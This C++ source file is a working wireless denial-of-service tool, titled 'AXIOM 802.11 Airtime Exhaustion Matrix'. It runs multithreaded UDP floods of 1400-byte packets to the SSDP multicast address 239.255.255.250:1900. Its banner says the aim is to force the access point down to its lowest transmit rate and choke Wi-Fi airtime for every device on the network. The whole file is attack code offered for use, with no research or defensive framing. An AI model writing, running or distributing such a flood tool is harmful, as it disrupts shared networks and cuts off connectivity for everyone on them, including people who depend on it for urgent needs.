#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <chrono>
#include <iomanip>

// ==============================================================================
// 1. Global Telemetry & State
// ==============================================================================
std::atomic<uint64_t> total_packets_sent(0);
std::atomic<bool> should_exit(false);

// ==============================================================================
// 2. The Multicast Flood Thread
// ==============================================================================
void flood_thread(int thread_id) {
    // 1. Create standard UDP socket (No CAP_NET_RAW required)
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        std::cerr << "[-] Thread " << thread_id << ": Socket creation failed\n";
        return;
    }

    // 2. Set Multicast TTL to 2 (Keeps the storm strictly on the local LAN)
    int ttl = 2;
    setsockopt(sock, IPPROTO_IP, IP_MULTICAST_TTL, &ttl, sizeof(ttl));

    // 3. Configure destination: SSDP Multicast Address (239.255.255.250:1900)
    // This target is universally listened to by smart TVs, phones, IoT, and routers.
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(1900);
    if (inet_pton(AF_INET, "239.255.255.250", &dest_addr.sin_addr) <= 0) {
        std::cerr << "[-] Thread " << thread_id << ": Invalid multicast address\n";
        close(sock);
        return;
    }

    // 4. Prepare the payload (1400 bytes to maximize payload-to-overhead ratio)
    std::vector<char> payload(1400, 'A'); 

    uint64_t local_count = 0;

    // 5. The Flood Loop
    while (!should_exit.load(std::memory_order_relaxed)) {
        // sendto() pushes the packet to the kernel's UDP queue.
        // The kernel handles the 802.11 MAC layer transmission.
        if (sendto(sock, payload.data(), payload.size(), 0, 
                   (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            // If the kernel queue is full, sleep briefly to prevent CPU spinning
            std::this_thread::sleep_for(std::chrono::microseconds(100));
        } else {
            local_count++;
            // Batch update the global atomic counter to reduce cache-line bouncing
            if (local_count % 1000 == 0) {
                total_packets_sent.fetch_add(1000, std::memory_order_relaxed);
                local_count = 0;
            }
        }
    }
    close(sock);
}

// ==============================================================================
// 3. Telemetry Display Thread
// ==============================================================================
void display_stats() {
    auto start_time = std::chrono::steady_clock::now();
    
    while (!should_exit.load(std::memory_order_relaxed)) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        
        uint64_t current_total = total_packets_sent.load(std::memory_order_relaxed);
        auto now = std::chrono::steady_clock::now();
        double elapsed = std::chrono::duration<double>(now - start_time).count();
        
        std::cout << "[*] Airtime Storm Active | Total Packets: " << current_total 
                  << " | Avg Rate: " << std::fixed << std::setprecision(0) 
                  << (current_total / elapsed) << " pps" << std::endl;
    }
}

// ==============================================================================
// 4. Execution Entry Point
// ==============================================================================
int main() {
    std::cout << "=================================================================\n";
    std::cout << "  AXIOM 802.11 AIRTIME EXHAUSTION MATRIX\n";
    std::cout << "  Target: 239.255.255.250:1900 (SSDP Multicast)\n";
    std::cout << "  Effect: Forces AP to broadcast at lowest basic rate (1-6 Mbps)\n";
    std::cout << "  Result: Chokes Wi-Fi airtime for ALL devices on the network.\n";
    std::cout << "=================================================================\n";
    std::cout << "[*] Initializing threads...\n";

    // Spawn threads based on CPU cores to saturate the local network stack
    unsigned int num_threads = std::thread::hardware_concurrency() * 2;
    if (num_threads < 4) num_threads = 4; // Minimum 4 threads for adequate flood
    
    std::vector<std::thread> threads;
    for (unsigned int i = 0; i < num_threads; i++) {
        threads.emplace_back(flood_thread, i);
    }

    // Start telemetry
    std::thread stats_thread(display_stats);

    std::cout << "[+] Flood engaged. " << num_threads << " threads active.\n";
    std::cout << "[*] Press ENTER to abort and restore network...\n";
    
    std::cin.get();

    // Teardown sequence
    should_exit.store(true, std::memory_order_relaxed);
    for (auto& t : threads) {
        t.join();
    }
    stats_thread.join();

    std::cout << "[+] Storm aborted. Network airtime clearing...\n";
    return 0;
}
